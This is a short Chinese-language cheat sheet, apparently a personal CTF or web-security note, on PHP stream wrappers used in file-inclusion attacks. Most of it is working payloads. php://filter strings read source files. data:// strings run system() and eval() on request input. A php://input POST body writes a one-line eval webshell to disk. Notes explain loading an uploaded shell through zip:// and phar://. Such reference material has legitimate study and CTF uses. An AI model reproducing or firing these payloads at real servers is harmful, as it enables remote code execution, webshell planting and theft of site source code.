---
title: "伪协议"
date: 2025-12-11 14:57:10
categories: "WEB"
tags:
  - "WEB"
cover: /img/backgrounds/bg-18.png
top_img: /img/backgrounds/bg-18.png
disableNunjucks: true
---

**1 php://filter  #查指定文件源码**

php://filter/read=convert.base64-encode/resource=index.php

替换编码方式绕过

php://filter/convert.iconv.utf8.utf16/resource=index.php

php://filter/string.rot13/resource=file

string.toupper

string.tolower

string.strip_tags

php://filter/resource=index.php

php://filter/read=convert.quoted-printable-encode/resource=index.php



**2 data://**

`data://协议`通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行

data://text/plain,<?php system($_GET['a']);?>

data://text/plain,<?php%20@eval($_POST[%27a%27]);phpinfo();?>

data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

**3 file://**

file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)

**4 php://**

**5 php://input**

`<font style="color:rgb(51, 51, 51);">php://input协议</font>`可以访问请求的原始数据,配合文件包含漏洞可以将post请求体中的内容当做文件内容执行,从而实现任意代码执行,需要注意的是,当表单 `<font style="color:rgb(51, 51, 51);">enctype=multipart/form-data</font>`时,php://input将会无效

php://input post请求体：<?php system($_GET['a']);?>

若有写入权限，写入一句话木马

[?file=php://input](http://127.0.0.1/include.php?file=php://input)

[POST DATA部分]

<?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>

**6 zip:// **

zip://shell.php 先将shell.php压缩为zip文件,然后上传，利用zip://文件名读取

phar://shell.php 同zip伪协议



